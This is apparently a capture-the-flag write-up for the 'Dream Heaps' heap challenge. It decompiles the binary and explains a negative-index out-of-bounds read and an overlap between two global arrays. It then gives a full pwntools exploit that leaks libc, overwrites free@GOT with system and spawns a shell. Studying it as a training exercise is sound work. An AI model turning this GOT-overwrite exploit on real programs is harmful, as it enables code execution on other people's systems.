# Dream Heaps
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/6403a6e7-041b-4485-9188-951a84c3ce29)  

## Reversing
```c
void main(void)

{
  long in_FS_OFFSET;
  undefined4 choice;
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  choice = 0;
  setbuf(stdout,(char *)0x0);
  puts("Online dream catcher! Write dreams down and come back to them later!\n");
  do {
    puts("What would you like to do?");
    puts("1: Write dream");
    puts("2: Read dream");
    puts("3: Edit dream");
    puts("4: Delete dream");
    printf("5: Quit\n> ");
    __isoc99_scanf(&%d,&choice);
                    /* WARNING: Could not find normalized switch variable to match jumptable */
                    /* WARNING: This code block may not be properly labeled as switch case */
    puts("Not an option!\n");
  } while( true );
}
```
It seems that depending on our input, different functions are called. Looking at the disassembly makes this more clear.  
```
        00400b2d ff e0           JMP        RAX
                             LAB_00400b2f                                    XREF[1]:     00400e00(*)  
        00400b2f b8 00 00        MOV        EAX,0x0
                 00 00
        00400b34 e8 ad fc        CALL       new_dream                                        undefined new_dream()
                 ff ff
        00400b39 eb 39           JMP        LAB_00400b74
                             LAB_00400b3b                                    XREF[1]:     00400e08(*)  
        00400b3b b8 00 00        MOV        EAX,0x0
                 00 00
        00400b40 e8 5d fd        CALL       read_dream                                       undefined read_dream()
                 ff ff
        00400b45 eb 2d           JMP        LAB_00400b74
                             LAB_00400b47                                    XREF[1]:     00400e10(*)  
        00400b47 b8 00 00        MOV        EAX,0x0
                 00 00
        00400b4c e8 e6 fd        CALL       edit_dream                                       undefined edit_dream()
                 ff ff
        00400b51 eb 21           JMP        LAB_00400b74
                             LAB_00400b53                                    XREF[1]:     00400e18(*)  
        00400b53 b8 00 00        MOV        EAX,0x0
                 00 00
        00400b58 e8 8f fe        CALL       delete_dream                                     undefined delete_dream()
                 ff ff
        00400b5d eb 15           JMP        LAB_00400b74
                             LAB_00400b5f                                    XREF[1]:     00400e20(*)  
        00400b5f bf 00 00        MOV        EDI,0x0
                 00 00
        00400b64 e8 67 fb        CALL       <EXTERNAL>::exit                                 void exit(int __status)
                 ff ff

```
Let's look at each of these functions separately and see if we can find anything interesting.  
### new_dream()
```c

void new_dream(void)

{
  long in_FS_OFFSET;
  int chunk_size;
  undefined *chunk_ptr;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  chunk_size = 0;
  puts("How long is your dream?");
  __isoc99_scanf(&%d,&chunk_size);
  chunk_ptr = (undefined *)malloc((long)chunk_size);
  puts("What are the contents of this dream?");
  read(0,chunk_ptr,(long)chunk_size);
  (&HEAP_PTRS)[INDEX] = chunk_ptr;
  *(int *)((long)&SIZES + (long)INDEX * 4) = chunk_size;
  INDEX = INDEX + 1;
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
Notice that both the pointer to our chunk and the size (controller by us not the actual size that malloc allocates) are put in the bss section.  
There is no check to how many chunks we allocate.  
Additionally HEAP_PTRS is at `0x006020a0` and SIZES is at `0x006020e0`, which means that we could potentially overflow from one to the other.  

### read_dream()
```c
void read_dream(void)

{
  long in_FS_OFFSET;
  int read_n;
  undefined *chunk_ptr;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  puts("Which dream would you like to read?");
  read_n = 0;
  __isoc99_scanf(&%d,&read_n);
  if (INDEX < read_n) {
    puts("Hmm you skipped a few nights...");
  }
  else {
                    /* Potentially read memory by inputting a negative index */
    chunk_ptr = (&HEAP_PTRS)[read_n];
    printf("%s",chunk_ptr);
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
Here the important part is that they check that we are not trying to read past the end of our HEAP_PTRS, but there is no check to prevent us of providing a negative index.  
This would allow us to read arbitrary memory before the `.bss` section.  

### edit_dream()
```c

void edit_dream(void)

{
  long in_FS_OFFSET;
  int edit_n;
  int chunk_size;
  undefined *chunk_ptr;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Which dream would you like to change?");
  edit_n = 0;
  __isoc99_scanf(&%d,&edit_n);
  if (INDEX < edit_n) {
    puts("You haven\'t had this dream yet...");
  }
  else {
    chunk_ptr = (&HEAP_PTRS)[edit_n];
    chunk_size = *(int *)((long)&SIZES + (long)edit_n * 4);
    read(0,chunk_ptr,(long)chunk_size);
    chunk_ptr[chunk_size] = 0;
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
Here we index into HEAP_PTRS and into SIZE and use write into that memory address.  
If we can corrupt those two values, we can arbitrarily write memory.  

### delete_dream()
```c
void delete_dream(void)

{
  long in_FS_OFFSET;
  int index;
  undefined *chunk_ptr;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  puts("Which dream would you like to delete?");
  index = 0;
  __isoc99_scanf(&%d,&index);
  if (INDEX < index) {
    puts("Nope, you can\'t delete the future.");
  }
  else {
    chunk_ptr = (&HEAP_PTRS)[index];
    free(chunk_ptr);
    (&HEAP_PTRS)[index] = (undefined *)0x0;
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
This one just calls free on our chunk of choice.  

## Exploitation  
First thing we can do is abuse `read_dream()` and provide a negative address to get a libc leak and bypass ASLR.  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/2abf957f-6fe0-47f4-8298-adfeefd4022e)  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/2db53698-c507-4574-9b98-262358313f6f)  
So we can just input as for the -263021 dream and we will leak the address of puts.  
```python
    r = conn()

    r.sendline(b'2') #Read dream
    r.recvuntil(b'Which dream would you like to read?\n')
    r.sendline(b'-263021') # Read puts@got
    libc_leak = r.recv(6)
    libc_leak = int.from_bytes(libc_leak,'little')
    print(hex(libc_leak))

    libc.address = libc_leak - libc.sym['puts']
```

Next, we need to find a way to corrupt the HEAP_PTRS and SIZES so that we can use `edit_dream()` to write arbitrary memory, in this case we would like to overwrite a got entry.  
If we look at `delete_dream` we can notice that if we had a chunk with content `/bin/sh`, and we overwrote `free()` with `system()`, then we could just "delete" that chunk to get a shell.  
Therefore, our objective is to overwrite the got entry of `free()` with `system()`.  

Since HEAP_PTRS is at `0x006020a0` and SIZES is at `0x006020e0`, we can create chunks, until HEAP_PTRS overlaps into SIZES, and since we control SIZES, we can create an arbitrary pointer.  

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/b9ec6334-2ee9-470e-b4ea-c84d814348b5)  
Notice that HEAP_PTRS[17] is the same as SIZES[18] and SIZES[19], so we can use that to create a pointer to free@got, and then overwrite it with system.  
```python
def new(content, length):
        r.sendlineafter(b"> ", b"1")
        r.sendlineafter(b"?\n", str(length).encode())
        r.sendlineafter(b"?\n", content)

    new(b"/bin/sh",0x10) # /bin/sh string
    # pad until location of interest
    for i in range(17):
        new(b"A",16)

    new(b'',0x602018) # free@got
    new(b'',0) # write 0 on other half of pointer

    r.sendline(b'3') #edit dream
    r.sendline(b'17') #edit our pointer to free@got
    r.send(p64(libc.sym["__libc_system"]))
```

Then just free the `/bin/sh` chunk to get a shell.  

Putting it all together we have:
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("dream_heaps_patched")
libc = ELF("libc-2.27.so")

context.binary = exe


def conn():
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r)

    return r


def main():
    r = conn()

    r.sendline(b'2') #Read dream
    r.recvuntil(b'Which dream would you like to read?\n')
    r.sendline(b'-263021') # Read puts@got
    libc_leak = r.recv(6)
    libc_leak = int.from_bytes(libc_leak,'little')
    print(hex(libc_leak))

    libc.address = libc_leak - libc.sym['puts']

    def new(content, length):
        r.sendlineafter(b"> ", b"1")
        r.sendlineafter(b"?\n", str(length).encode())
        r.sendlineafter(b"?\n", content)

    new(b"/bin/sh",0x10) # /bin/sh string
    # pad until location of interest
    for i in range(17):
        new(b"A",16)

    new(b'',0x602018) # free@got
    new(b'',0) # write 0 on other half of pointer

    r.sendline(b'3') #edit dream
    r.sendline(b'17') #edit our pointer to free@got
    r.send(p64(libc.sym["__libc_system"]))

    #trigger call to free('/bin/sh')
    r.sendline(b'4') #delete dream
    r.sendline(b'0') #index 0

    r.clean()
    r.interactive()


if __name__ == "__main__":
    main()
```

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/1b1787bc-85ac-453f-ab9e-6c792cf1f455)






